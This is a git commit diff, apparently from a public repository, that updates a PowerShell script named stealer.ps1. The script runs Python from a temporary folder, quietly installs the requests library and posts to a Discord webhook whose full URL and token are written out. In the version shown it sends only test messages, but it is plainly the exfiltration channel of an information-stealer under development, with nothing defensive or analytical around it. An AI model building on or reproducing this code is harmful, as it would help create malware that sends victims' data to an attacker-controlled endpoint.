73e2eef6bf8686ca100910db6538094ea2a2f2cf
Ily3s <116631559+sddyes@users.noreply.github.com>
2026-02-01 22:05:38 +0100

    Update stealer.ps1

--- stealer.ps1
+++ stealer.ps1
@@ -1,3 +1,5 @@
 cd $env:TEMP\py
 
-.\python.exe -c "import subprocess; subprocess.run(['curl.exe','-X','POST','-H','Content-Type: application/json','-d','{\"content\":\"TEST MESSAGE\"}','https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W'])"
+.\python.exe -m pip install requests --quiet
+
+.\python.exe -c "import requests; requests.post('https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W', json={'content':'TEST'})"
